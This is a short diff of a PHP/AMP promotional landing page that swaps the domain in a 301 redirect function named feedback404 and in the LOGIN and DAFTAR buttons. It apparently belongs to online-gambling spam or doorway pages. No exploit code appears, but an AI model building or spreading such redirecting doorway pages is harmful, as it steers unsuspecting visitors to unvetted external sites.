@@ -3,7 +3,7 @@
     function feedback404()
     {
     header("HTTP/1.1 301 Moved Permanently");
-    header("Location: https://babygod.site");
+    header("Location: https://wajibbasah2.uk");
     header("Connection: close");
 
     }
@@ -819,7 +819,7 @@
                 <div class="tengah"><a href="#"></a><br>
                     <div><a href="" target="_blank" rel="noopener noreferrer nofollow">
                     <amp-img height="250" width="250" class="animated tada infinite slower" alt="<?php echo $BRANDS ?>" src="https://diatasnormal.pro/images/mantapkali_bwfwjb.jpg"></amp-img></a></div>
-                    <div class="kiw-kiw"><a href="https://wajibbasah.us/" target="_blank" rel="noopener noreferrer nofollow"><button
+                    <div class="kiw-kiw"><a href="https://wajibbasah2.uk/" target="_blank" rel="noopener noreferrer nofollow"><button
                                 class="btn2 animated fadeInLeft slow"><strong>LOGIN</strong>
                                 <div id="container-animation">
                                     <div id="stars"></div>
@@ -828,7 +828,7 @@
                                     <div class="circle"></div>
                                     <div class="circle"></div>
                                 </div>
-                            </button></a><br><a href="https://wajibbasah.us/" target="_blank" rel="noopener noreferrer nofollow"
+                            </button></a><br><a href="https://wajibbasah2.uk/" target="_blank" rel="noopener noreferrer nofollow"
                             class="btn1 contole link1 animated fadeInBottom slow">DAFTAR</a></div>
                 </div>
                 <h1 class="text-center animated heartBeat slow infinite">🔥 <?php echo $BRANDS ?> 🔥</h1>
